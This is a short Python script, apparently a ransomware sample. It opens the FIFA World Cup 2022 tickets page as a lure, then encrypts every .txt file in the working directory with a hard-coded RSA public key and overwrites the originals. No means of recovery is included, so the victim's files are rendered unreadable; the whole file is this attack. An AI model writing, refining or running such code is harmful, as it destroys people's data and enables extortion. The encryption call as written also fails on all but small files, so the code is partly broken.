import os
import rsa
import time
import webbrowser

from Crypto.PublicKey import RSA

url = 'https://www.fifa.com/fifaplus/en/tournaments/mens/worldcup/qatar2022/tickets'
webbrowser.open(url)

Fls=[]

for fls in os.listdir():
    if os.path.isfile(fls):

        if fls.endswith(".txt"):       
            Fls.append(fls)

   
puKey = """
-----BEGIN RSA PUBLIC KEY-----
MIIBigKCAYEApTyPqTs2QLaktSMabc7Ao7I6v7TQPYqRUs2Z47kHJEnW50gNpCnO
L5+LheVNBeK4LsgWA5J7WqWzhZis/ZSZRGELSW7Ma2kIQY8o/xofEp7cBlVC4DuV
GoqA5AR/rPNbgNhpiArXMd276UeR2NjX46iSKZ773LCNSbn83KD25NaBdUlX66ln
R2jXwcuk4jsDwhtNxxT9pDB3W8e08gHeo0TEC+vD6szW5VS4DqV+p0WO1pDKaiCl
DAUttA0/4WnLp6F83wxqtZUdPRim9wrlz8+4ivawkEI1IF5xtKokWAtYNSxFH+Hn
7gsPT6psKRb6BWB7/IFN9t+AUaRnym8QC+pI//K4EK46jGHPyJEK4Eqch8JdWw1i
1q8pfRnAB89Y4/Kx5vMzAtQ9wTxRoUp3WOZBo43K1CSHj9h8oVtI4auyXF2TMb4O
GXHp7MYgj6dWySGV9BCqsCpwjebI0U53Qk/z39A8IrP+29MGaOXv4L2eN1pljD3c
kymiZP+hJEYZAgMBAAE=
-----END RSA PUBLIC KEY-----

"""

pbkey = rsa.PublicKey.load_pkcs1(puKey)


for fls in Fls:
    with open(fls, "rb") as thefls: 
        content = thefls.read() 
        cipher_content = rsa.encrypt(content, pbkey)

    with open(fls, "wb") as thefls:
        thefls.write(cipher_content)
        thefls.close()
        print("File Encrypted !!"+fls)
        time.sleep(2)

